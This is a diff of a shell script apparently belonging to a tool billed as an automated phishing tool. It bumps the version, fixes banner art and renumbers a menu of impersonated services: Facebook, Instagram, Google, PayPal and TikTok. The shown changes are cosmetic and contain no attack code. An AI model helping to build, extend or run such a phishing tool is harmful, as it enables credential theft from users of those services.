@@ -2,7 +2,7 @@
 
 ##   Phisher 	: 	Automated Phishing Tool
 ##   Author 	: 	MAMBA MENTALITY 
-##   Version 	: 	2.3.5
+##   Version 	: 	6.9
 ##   Github 	: 	https://github.com/mamba-9mm/phishing
 
 
@@ -211,12 +211,12 @@ banner_small() {
 	cat <<- EOF
 		${WHITE}
 		${BLUE}
-		${BLUE}██████╗ ██╗  ██╗██╗███████╗██╗  ██╗██╗███╗   ██╗ ██████╗ 
-		${BLUE}██╔══██╗██║  ██║██║██╔════╝██║  ██║██║████╗  ██║██╔════╝ 
+		${BLUE}██████╗ ██╗  ██╗██╗███████╗██╗  ██╗██╗███╗    ██╗ ██████╗ 
+		${BLUE}██╔══██╗██║  ██║██║██╔════╝██║  ██║██║████╗   ██║██╔════╝ 
 		${BLUE}██████╔╝███████║██║███████╗███████║██║██╔██╗ ██║██║  ███╗
 		${BLUE}██╔═══╝ ██╔══██║██║╚════██║██╔══██║██║██║╚██╗██║██║   ██║
 		${BLUE}██║      ██║  ██║██║███████║██║  ██║██║██║ ╚████║╚██████╔╝
-		${BLUE}╚═╝      ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝ WHITE}  ${__version__}
+		${BLUE}╚═╝      ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝{WHITE} ${__version__}
 	EOF
 }
 
@@ -702,8 +702,8 @@ main_menu() {
 		${RED}[${WHITE}01${RED}]${ORANGE} Facebook      
 		${RED}[${WHITE}02${RED}]${ORANGE} Instagram     
 		${RED}[${WHITE}03${RED}]${ORANGE} Google        
-		${RED}[${WHITE}06${RED}]${ORANGE} Paypal        
-		${RED}[${WHITE}10${RED}]${ORANGE} Tiktok        
+		${RED}[${WHITE}04${RED}]${ORANGE} Paypal        
+		${RED}[${WHITE}05${RED}]${ORANGE} Tiktok        
 
 		${RED}[${WHITE}99${RED}]${ORANGE} About         ${RED}[${WHITE}00${RED}]${ORANGE} Exit
 
